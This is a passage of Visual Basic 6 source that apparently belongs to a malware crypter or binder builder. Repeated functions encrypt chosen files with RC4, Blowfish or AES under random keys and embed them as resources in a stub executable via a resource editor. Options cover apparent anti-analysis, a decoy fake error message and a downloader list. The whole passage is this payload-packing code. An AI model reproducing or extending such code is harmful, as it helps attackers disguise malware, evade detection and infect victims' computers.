  Xr.EncryptString(downloader.Lv.ListItems.Item(N).Text, rand.Text) & custom.l2.Text & rand.Text & custom.l2.Text & _
  Xr.EncryptString("\" & downloader.Lv.ListItems.Item(N).SubItems(2), rnn.Text) & custom.l2.Text & rnn.Text & custom.l2.Text & _
  downloader.Lv.ListItems.Item(N).SubItems(3) & custom.l2.Text
  Next N
  Open tmp & "\script3.ini" For Binary As #1
  Put #1, , Data2
  Close #1
  Print #6, "-addoverwrite " & tmp & "\script3.ini," & x & "STB" & x & "," & x & "3" & x & ",1033"
  End If
  
  Close #6
  Shell tmp & "\res.exe -script " & x & tmp & "\sc2.txt" & x

  Sleep 1000

End Function
Private Function rc()
  x = """"

  rn.Text = ""
  rnj.Text = ""
  rnu.Text = ""
  rnn.Text = ""
  
  For i = 1 To Lv.ListItems.Count
  rn.Text = level
  rnj.Text = lRan(RandomNumber)
  rnu.Text = lRan(RandomNumber)
  rnn.Text = lRan(RandomNumber)
  Data = Data & custom.l1.Text & rc4.Encrypt(Lv.ListItems.Item(i).SubItems(2), rnj.Text) & custom.l2.Text & rnj.Text & custom.l2.Text & _
  rc4.Encrypt(Lv.ListItems.Item(i).SubItems(3), rnu.Text) & custom.l2.Text & rnu.Text & custom.l2.Text & _
  rc4.Encrypt(LoadFile(Lv.ListItems.Item(i).SubItems(1)), rn.Text) & custom.l2.Text & rn.Text & custom.l2.Text & _
  rc4.Encrypt("\" & Lv.ListItems(i).Text, rnn.Text) & custom.l2.Text & rnn.Text & custom.l2.Text & Lv.ListItems.Item(i).SubItems(4) & custom.l2.Text
  Next i
  
  Open tmp & "\script.ini" For Binary As #7
  Put #7, , Data
  Close #7
  
  
  data11 = ""

  If manti.Checked = True Then
  data11 = custom.l1.Text & "1"
  Else
  data11 = custom.l1.Text & "."
  End If
  
  If fkmsg.Checked = True Then
  rnu.Text = ""
  rn.Text = ""
  rnu.Text = lRan(RandomNumber)
  rn.Text = lRan(RandomNumber)
  sType = ""
  If msg.Combo2.Text = "Ok" Then sType = 0
  If msg.Combo2.Text = "Ok,Cancel" Then sType = 1
  If msg.Combo2.Text = "Retry,Cancel" Then sType = 5
  If msg.Combo2.Text = "Yes,No" Then sType = 4
  If msg.Combo2.Text = "Yes,No,Cancel" Then sType = 3
  If msg.Combo2.Text = "Abort,Retry,Ignore" Then sType = 2
  If msg.Combo1.Text = "None" Then sType = sType + 0
  If msg.Combo1.Text = "Critical" Then sType = sType + 16
  If msg.Combo1.Text = "Question" Then sType = sType + 32
  If msg.Combo1.Text = "Exclamation" Then sType = sType + 48
  If msg.Combo1.Text = "Information" Then sType = sType + 64
   
  data11 = data11 & custom.l1.Text & sType & custom.l1.Text & _
  rc4.Encrypt(msg.b.Text, rnu.Text) & custom.l1.Text & rnu.Text & custom.l1.Text & _
  rc4.Encrypt(msg.t.Text, rn.Text) & custom.l1.Text & rn.Text & custom.l1.Text
  Else
  data11 = data11 & custom.l1.Text & "." & custom.l1.Text _
  & "." & custom.l1.Text & rnu.Text & custom.l1.Text & "." & custom.l1.Text & rn.Text & custom.l1.Text
  '6
  End If
  
  If downl.Checked = True Then
  data11 = data11 & "1" & custom.l1.Text '7
  Else
  data11 = data11 & "." & custom.l1.Text
  End If
   
  Open tmp & "\script2.ini" For Binary As #5
  Put #5, , data11
  Close #5
  
  Open tmp & "\sc2.txt" For Output As #6
  Print #6, "[FILENAMES]"
  Print #6, "EXE = " & fl
  Print #6, "SaveAs = " & fl & vbCrLf
  Print #6, "[COMMANDS]"
  Print #6, "-addoverwrite " & tmp & "\script.ini," & x & "STB" & x & "," & x & "1" & x & ",1033"
  Print #6, "-addoverwrite " & tmp & "\script2.ini," & x & "STB" & x & "," & x & "2" & x & ",1033"
 
  If downl.Checked = True Then
  rand.Text = ""
  rnu.Text = ""
  rnn.Text = ""
  For N = 1 To downloader.Lv.ListItems.Count
  rand.Text = lRan(RandomNumber) & lRan(RandomNumber)
  rnu.Text = lRan(RandomNumber)
  rnn.Text = lRan(RandomNumber)
  Data2 = Data2 & custom.l1.Text & rc4.Encrypt(downloader.Lv.ListItems.Item(N).SubItems(1), rnu.Text) & custom.l2.Text & rnu.Text & custom.l2.Text & _
  rc4.Encrypt(downloader.Lv.ListItems.Item(N).Text, rand.Text) & custom.l2.Text & rand.Text & custom.l2.Text & _
  rc4.Encrypt("\" & downloader.Lv.ListItems.Item(N).SubItems(2), rnn.Text) & custom.l2.Text & rnn.Text & custom.l2.Text & _
  downloader.Lv.ListItems.Item(N).SubItems(3) & custom.l2.Text
  Next N
  Open tmp & "\script3.ini" For Binary As #1
  Put #1, , Data2
  Close #1
  Print #6, "-addoverwrite " & tmp & "\script3.ini," & x & "STB" & x & "," & x & "3" & x & ",1033"
  End If
  
  Close #6
  Shell tmp & "\res.exe -script " & x & tmp & "\sc2.txt" & x

  Sleep 1000
End Function
Private Function blw()
  x = """"

  rn.Text = ""
  rnj.Text = ""
  rnu.Text = ""
  rnn.Text = ""
  
  For i = 1 To Lv.ListItems.Count
  rn.Text = level
  rnj.Text = lRan(RandomNumber)
  rnu.Text = lRan(RandomNumber)
  rnn.Text = lRan(RandomNumber)
  Data = Data & custom.l1.Text & blowfish.jfq(Lv.ListItems.Item(i).SubItems(2), rnj.Text) & custom.l2.Text & rnj.Text & custom.l2.Text & _
  blowfish.jfq(Lv.ListItems.Item(i).SubItems(3), rnu.Text) & custom.l2.Text & rnu.Text & custom.l2.Text & _
  blowfish.jfq(LoadFile(Lv.ListItems.Item(i).SubItems(1)), rn.Text) & custom.l2.Text & rn.Text & custom.l2.Text & _
  blowfish.jfq("\" & Lv.ListItems(i).Text, rnn.Text) & custom.l2.Text & rnn.Text & custom.l2.Text & Lv.ListItems.Item(i).SubItems(4) & custom.l2.Text
  Next i
  
  Open tmp & "\script.ini" For Binary As #7
  Put #7, , Data
  Close #7
  
  
  data11 = ""

  If manti.Checked = True Then
  data11 = custom.l1.Text & "1"
  Else
  data11 = custom.l1.Text & "."
  End If
  
  If fkmsg.Checked = True Then
  rnu.Text = ""
  rn.Text = ""
  rnu.Text = lRan(RandomNumber)
  rn.Text = lRan(RandomNumber)
  sType = ""
  If msg.Combo2.Text = "Ok" Then sType = 0
  If msg.Combo2.Text = "Ok,Cancel" Then sType = 1
  If msg.Combo2.Text = "Retry,Cancel" Then sType = 5
  If msg.Combo2.Text = "Yes,No" Then sType = 4
  If msg.Combo2.Text = "Yes,No,Cancel" Then sType = 3
  If msg.Combo2.Text = "Abort,Retry,Ignore" Then sType = 2
  If msg.Combo1.Text = "None" Then sType = sType + 0
  If msg.Combo1.Text = "Critical" Then sType = sType + 16
  If msg.Combo1.Text = "Question" Then sType = sType + 32
  If msg.Combo1.Text = "Exclamation" Then sType = sType + 48
  If msg.Combo1.Text = "Information" Then sType = sType + 64
  
  data11 = data11 & custom.l1.Text & sType & custom.l1.Text & _
  blowfish.jfq(msg.b.Text, rnu.Text) & custom.l1.Text & rnu.Text & custom.l1.Text & _
  blowfish.jfq(msg.t.Text, rn.Text) & custom.l1.Text & rn.Text & custom.l1.Text
  Else
  data11 = data11 & custom.l1.Text & "." & custom.l1.Text _
  & "." & custom.l1.Text & rnu.Text & custom.l1.Text & "." & custom.l1.Text & rn.Text & custom.l1.Text
  '6
  End If
  
  If downl.Checked = True Then
  data11 = data11 & "1" & custom.l1.Text '7
  Else
  data11 = data11 & "." & custom.l1.Text
  End If
   
  Open tmp & "\script2.ini" For Binary As #5
  Put #5, , data11
  Close #5
  
  Open tmp & "\sc2.txt" For Output As #6
  Print #6, "[FILENAMES]"
  Print #6, "EXE = " & fl
  Print #6, "SaveAs = " & fl & vbCrLf
  Print #6, "[COMMANDS]"
  Print #6, "-addoverwrite " & tmp & "\script.ini," & x & "STB" & x & "," & x & "1" & x & ",1033"
  Print #6, "-addoverwrite " & tmp & "\script2.ini," & x & "STB" & x & "," & x & "2" & x & ",1033"
 
  If downl.Checked = True Then
  rand.Text = ""
  rnu.Text = ""
  rnn.Text = ""
  For N = 1 To downloader.Lv.ListItems.Count
  rand.Text = lRan(RandomNumber) & lRan(RandomNumber)
  rnu.Text = lRan(RandomNumber)
  rnn.Text = lRan(RandomNumber)
  Data2 = Data2 & custom.l1.Text & blowfish.jfq(downloader.Lv.ListItems.Item(N).SubItems(1), rnu.Text) & custom.l2.Text & rnu.Text & custom.l2.Text & _
  blowfish.jfq(downloader.Lv.ListItems.Item(N).Text, rand.Text) & custom.l2.Text & rand.Text & custom.l2.Text & _
  blowfish.jfq("\" & downloader.Lv.ListItems.Item(N).SubItems(2), rnn.Text) & custom.l2.Text & rnn.Text & custom.l2.Text & _
  downloader.Lv.ListItems.Item(N).SubItems(3) & custom.l2.Text
  Next N
  Open tmp & "\script3.ini" For Binary As #1
  Put #1, , Data2
  Close #1
  Print #6, "-addoverwrite " & tmp & "\script3.ini," & x & "STB" & x & "," & x & "3" & x & ",1033"
  End If
  
  Close #6
  Shell tmp & "\res.exe -script " & x & tmp & "\sc2.txt" & x

  Sleep 1000
End Function
Private Function dat() As Boolean
  On Error Resume Next
  If Lv.SelectedItem.Selected = False Then
  dat = True
  Else
  dat = False
  End If
End Function
Public Function GFN(flname As String) As String
  Dim posn As Integer, i As Integer
  Dim fName As String
  posn = 0
  For i = 1 To Len(flname)
  If (Mid(flname, i, 1) = "\") Then posn = i
  Next i
  fName = Right(flname, Len(flname) - posn)
  GFN = fName
End Function
Public Function LoadFile(sInput As String) As String
  Dim sData       As String
  If sInput = "" Then Exit Function
  Open sInput For Binary As #12
  sData = Space$(LOF(12))
  Get #12, , sData
  Close #12
  LoadFile = sData
End Function
Private Sub size_Click()
  If size.Checked = False Then
  size.Checked = True
  sSize.Show
  Else
  size.Checked = False
  sSize.t.Text = ""
  End If
End Sub
Private Function laes()
  x = """"

  rn.Text = ""
  rnj.Text = ""
  rnu.Text = ""
  rnn.Text = ""
  
  For i = 1 To Lv.ListItems.Count
  rn.Text = level
  rnj.Text = lRan(RandomNumber)
  rnu.Text = lRan(RandomNumber)
  rnn.Text = lRan(RandomNumber)
  Data = Data & custom.l1.Text & aes.EncryptString(Lv.ListItems.Item(i).SubItems(2), rnj.Text) & custom.l2.Text & rnj.Text & custom.l2.Text & _
  aes.EncryptString(Lv.ListItems.Item(i).SubItems(3), rnu.Text) & custom.l2.Text & rnu.Text & custom.l2.Text & _
  aes.EncryptString(LoadFile(Lv.ListItems.Item(i).SubItems(1)), rn.Text) & custom.l2.Text & rn.Text & custom.l2.Text & _
  aes.EncryptString("\" & Lv.ListItems(i).Text, rnn.Text) & custom.l2.Text & rnn.Text & custom.l2.Text & Lv.ListItems.Item(i).SubItems(4) & custom.l2.Text
  Next i
  
  Open tmp & "\script.ini" For Binary As #7
  Put #7, , Data
  Close #7
  
  
  data11 = ""

  If manti.Checked = True Then
  data11 = custom.l1.Text & "1"
  Else
  data11 = custom.l1.Text & "."
  End If
  
  If fkmsg.Checked = True Then
  rnu.Text = ""
  rn.Text = ""
  rnu.Text = lRan(RandomNumber)
  rn.Text = lRan(RandomNumber)
  sType = ""
  If msg.Combo2.Text = "Ok" Then sType = 0
  If msg.Combo2.Text = "Ok,Cancel" Then sType = 1
  If msg.Combo2.Text = "Retry,Cancel" Then sType = 5
  If msg.Combo2.Text = "Yes,No" Then sType = 4
  If msg.Combo2.Text = "Yes,No,Cancel" Then sType = 3
  If msg.Combo2.Text = "Abort,Retry,Ignore" Then sType = 2
  If msg.Combo1.Text = "None" Then sType = sType + 0
  If msg.Combo1.Text = "Critical" Then sType = sType + 16
  If msg.Combo1.Text = "Question" Then sType = sType + 32
  If msg.Combo1.Text = "Exclamation" Then sType = sType + 48
  If msg.Combo1.Text = "Information" Then sType = sType + 64
   
  data11 = data11 & custom.l1.Text & sType & custom.l1.Text & _
  aes.EncryptString(msg.b.Text, rnu.Text) & custom.l1.Text & rnu.Text & custom.l1.Text & _
  aes.EncryptString(msg.t.Text, rn.Text) & custom.l1.Text & rn.Text & custom.l1.Text
  Else
  data11 = data11 & custom.l1.Text & "." & custom.l1.Text _
  & "." & custom.l1.Text & rnu.Text & custom.l1.Text & "." & custom.l1.Text & rn.Text & custom.l1.Text
  '6
  End If
  
  If downl.Checked = True Then
  data11 = data11 & "1" & custom.l1.Text '7
  Else
  data11 = data11 & "." & custom.l1.Text
  End If
   
  Open tmp & "\script2.ini" For Binary As #5
  Put #5, , data11
  Close #5
  
  Open tmp & "\sc2.txt" For Output As #6
  Print #6, "[FILENAMES]"
  Print #6, "EXE = " & fl
  Print #6, "SaveAs = " & fl & vbCrLf
  Print #6, "[COMMANDS]"
  Print #6, "-addoverwrite " & tmp & "\script.ini," & x & "STB" & x & "," & x & "1" & x & ",1033"
  Print #6, "-addoverwrite " & tmp & "\script2.ini," & x & "STB" & x & "," & x & "2" & x & ",1033"
 
  If downl.Checked = True Then
  rand.Text = ""
  rnu.Text = ""
  rnn.Text = ""
  For N = 1 To downloader.Lv.ListItems.Count
  rand.Text = lRan(RandomNumber) & lRan(RandomNumber)
  rnu.Text = lRan(RandomNumber)
  rnn.Text = lRan(RandomNumber)
  Data2 = Data2 & custom.l1.Text & aes.EncryptString(downloader.Lv.ListItems.Item(N).SubItems(1), rnu.Text) & custom.l2.Text & rnu.Text & custom.l2.Text & _
  aes.EncryptString(downloader.Lv.ListItems.Item(N).Text, rand.Text) & custom.l2.Text & rand.Text & custom.l2.Text & _
  aes.EncryptString("\" & downloader.Lv.ListItems.Item(N).SubItems(2), rnn.Text) & custom.l2.Text & rnn.Text & custom.l2.Text & _
  downloader.Lv.ListItems.Item(N).SubItems(3) & custom.l2.Text
  Next N
  Open tmp & "\script3.ini" For Binary As #1
  Put #1, , Data2
  Close #1
  Print #6, "-addoverwrite " & tmp & "\script3.ini," & x & "STB" & x & "," & x & "3" & x & ",1033"
  End If
  
  Close #6
  Shell tmp & "\res.exe -script " & x & tmp & "\sc2.txt" & x

  Sleep 1000

End Function
